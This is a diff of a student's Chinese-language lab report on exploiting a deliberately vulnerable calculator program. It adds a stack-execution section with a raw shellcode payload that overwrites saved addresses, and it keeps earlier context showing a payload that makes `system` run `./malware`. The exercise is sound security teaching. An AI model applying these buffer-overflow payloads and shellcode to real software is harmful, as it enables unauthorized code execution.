@@ -37,7 +37,7 @@
 
 ### 3. 利用缓冲区漏洞执行 `./malware` (25 pts 测试 + 5 pts 报告)
 
-- 根据 Task 2 的截图 `command_buf` 的地址为 `0x6030d0`；在 `gets(expression)` 后，直接从 `expression` 复制过来，`input()` 返回；在 `eval()` 函数原地将表达式包装成指令在 `system` 运行；
+- 根据 2 的截图 `command_buf` 的地址为 `0x6030d0`；在 `gets(expression)` 后，直接从 `expression` 复制过来，`input()` 返回；在 `eval()` 函数原地将表达式包装成指令在 `system` 运行；
 - 仅当 `dark-calc` 执行 `./malware` 时才成功，需要让 `system` 函数运行 `./malware`，那么需要：
     - 将输入的前缀改为 `./malware`，剩余 7 字符可直接用 `\0`
     - 将 `0x0000721000800fe0` 的内容照抄，否则会段错误；
@@ -67,7 +67,19 @@ payload = b"./malware" + b"\x00" * 7 + b"\xf0\x0f\x80\x00\x10\x72\x00\x00" + b"\
 
 ### 5. 栈空间执行 (25 pts 测试 + 5 pts 报告)
 
+- 类似 3(Task1)，对 `0x0000721000800fe8` 改为 `expression` 的地址；不能改为 `command_buf` 是因为 `strcpy` 的时候会忽略第一个 `0x00` 及之后的部分；不能直接跳到 `grade_eval`，而是要先 `mov edi, 4`
+- `command_buf` 或 `expression` 都有 16B 的余量，够用来 `mov edi, 4; mov ebx, 0x401a87; call rbx; ret`
+- 将 `0x0000721000800fe0` 的内容照抄，否则会段错误；
 
+那么构造如下：
+```python
+payload = b"\xbf\x04\x00\x00\x00" + b"\xbb\x87\x1a\x40\x00" + b"\xff\xd3" + b"\xc3" + b"\x00" * 3 + b"\xf0\x0f\x80\x00\x10\x72\x00\x00" + b"\xd0\x0f\x80\x00\x10\x72\x00\x00"
+```
+
+结果如下：
+![5](assets/5.png)
+
+能正确输出 `Hope A will be your grade! `，但是段错误，不完美，但是我自己只能做到这个程度了。
 
 ### 6. ROP (10 pts 测试 + 10 pts 报告)
 
@@ -79,4 +91,4 @@ payload = b"./malware" + b"\x00" * 7 + b"\xf0\x0f\x80\x00\x10\x72\x00\x00" + b"\
 
 ### 使用的工具
 
-- Deepseek-V4.1-Flash-1017: 对于问题 1 帮我确定答案的出处；
+- Deepseek-V4.1-Flash-1017: 对于问题 1 帮我确定答案的出处；对于问题 4 仅查询 call 语法相关
